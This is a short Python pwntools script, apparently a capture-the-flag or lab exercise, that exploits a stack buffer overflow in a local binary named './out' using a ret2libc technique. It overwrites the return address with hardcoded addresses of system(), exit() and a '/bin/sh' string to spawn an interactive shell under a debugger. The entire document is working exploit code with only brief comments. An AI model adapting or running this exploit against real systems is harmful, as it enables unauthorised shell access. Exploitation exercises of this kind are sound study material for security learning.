from pwn import *

#p system
system = 0xf7e0c830
# find 0xf7e0c830,+9999999,"/bin/sh"
binsh = 0xf7f59352
#p exit
exit = 0xf7dff170

p = process("./out");
buff_len = 268
#Fill the buffer
buff = b'\x42'*buff_len
#Change EIP
buff += p32(system)
#Exit after system is called
buff += p32(exit)
#Argument for system()
buff += p32(binsh)
gdb.attach(p)
p.sendline(buff)
p.interactive()

